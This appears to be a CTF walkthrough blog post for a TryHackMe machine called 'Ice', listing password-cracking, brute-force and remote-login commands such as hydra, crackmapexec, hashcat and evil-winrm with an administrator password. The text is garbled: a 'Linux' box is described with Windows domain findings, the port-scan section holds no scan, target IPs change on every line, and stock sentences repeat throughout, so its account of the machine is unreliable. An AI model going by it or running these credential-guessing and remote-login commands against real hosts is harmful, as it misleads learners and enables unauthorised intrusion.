---
TitleSEO: "TryHackMe — Ice (Medium Linux) | ZureFX"
TitlePost: "TryHackMe — Ice (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Ice. SeImpersonatePrivilege and XXE to achieve medium compromise on Linux."
Keywords: "active directory, linux, hackthebox, ctf, medium, pwntilldawn, web"
URL: "https://zurefx.github.io/writeups/htb-ice-163.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ice-163/"
Date: "2025-03-04"
Tags: "Active Directory, Linux, HackTheBox, CTF, Medium, PwnTillDawn, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-ice-163"
Permalink: "/writeups/htb-ice-163.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ice** is rated **Medium** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.109.223.85`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.36.49.14 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.32.4.207 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.85.93.144/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.108.163.96 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.43.218.145 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.42.153.252/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

### Web Enumeration

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.84.76.241/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **SeImpersonatePrivilege**.

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```bash
feroxbuster -h
crackmapexec smb 10.121.170.139 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.162 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.75.203.23/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.123.88 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
feroxbuster -h
evil-winrm -i 10.58.104.174 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.82.127.2 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `wpscan`
- `msfvenom`
- `crackmapexec`
- `burpsuite`
- `ffuf`

### Key Takeaways

- SeImpersonatePrivilege
- XXE
- Open Redirect
